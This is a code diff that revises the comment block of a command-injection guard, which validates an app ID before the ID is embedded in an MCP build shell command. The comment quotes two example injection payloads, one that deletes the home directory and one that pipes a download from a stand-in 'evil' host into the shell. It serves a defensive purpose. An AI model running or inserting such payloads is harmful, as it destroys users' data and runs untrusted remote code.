@@ -3,8 +3,9 @@
 // Command-injection guard for the MCP build hand-off.
 //
 // The build command embeds the capacitor.config appId directly in a shell
-// command string that is either passed to osascript (Terminal.app) or shown
-// to an agent to run in its shell.  An attacker who controls the appId (e.g.
+// command string that the MCP spawns as a background build process, and that
+// is also shown to an agent to run in its shell.  An attacker who controls the
+// appId (e.g.
 // a malicious capacitor.config) could inject arbitrary shell code:
 //   com.x; rm -rf ~
 //   com.x$(curl evil|sh)
@@ -14,7 +15,7 @@
 //   alphanumeric and containing only [A-Za-z0-9_-] — e.g. com.example.app,
 //   io.capgo.app_1, com.acme.my-app.
 //
-// The pattern rejects every shell/AppleScript metacharacter:
+// The pattern rejects every shell metacharacter:
 //   space, ; $ ` ( ) & | > < # / ' " \ newline tab
 // and also rejects names without a dot (`nodots`, `com-example`, `foo_bar`)
 // and labels that start with `-` (which a shell could parse as a flag).
